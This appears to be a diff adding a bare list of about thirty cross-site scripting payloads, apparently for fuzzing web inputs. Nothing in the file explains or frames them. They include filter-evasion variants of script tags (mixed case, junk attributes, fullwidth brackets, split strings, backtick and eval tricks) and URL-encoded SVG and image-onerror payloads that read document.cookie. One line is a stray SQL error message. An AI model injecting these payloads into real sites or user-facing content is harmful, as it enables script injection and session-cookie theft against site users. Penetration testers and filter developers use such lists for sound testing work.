@@ -1,0 +1,34 @@
+<script%20TEST>alert(1)</script%20TESTTEST>
+<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+"><script akdk> prompt(document.domain)</script akdk>
+<script ~~~>alert(0%0)</script ~~~>
+"<script>alert(0)</script>"@gmail.com
+#/<script>alert(1234)</script>
+/<script>alert(1234)</script>
+<script>alert(1234)</script>
+<ScripT>alert(1234)</ScRipT>
+"><script>alert(123)</script>
+'><script>alert(123)</script>
+--><script>alert(123)</script>
+><script>alert(123)</script>
+＜script＞alert(123)＜/script＞
+"><script>alert(123);</script x="
+'><script>alert(123);</script x='
+><script>alert(123);</script x=
+<script>’alert(1)’.replace(/.+/,eval)</script>
+"><script>alert(1)</script><"
+#<script>alert(1)</script>
+'`"//><script>alert(1)</script>
+<!<script>alert(1)</script>
+<!<script>alert(1)</script> “
+<%<!--'%><script>alert(1);</script -->
+<%<script>alert(1)</script>
+<scr'+'ipt>alert(1)</scr'+'ipt>
+<script /**/>/**/alert(1)/**/</script /**/
+<script>/&/-alert(1)</script>
+<script>alert(1)</script>
+<script>alert`1`</script>
+\<script\>alert(1)\<\/script\>
+<front color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+%3Csvg+onload%3Dalert%26%230000000040document.cookie%29%3E
+<Img Src=OnXSS OnError=confirm(document.cookie)>
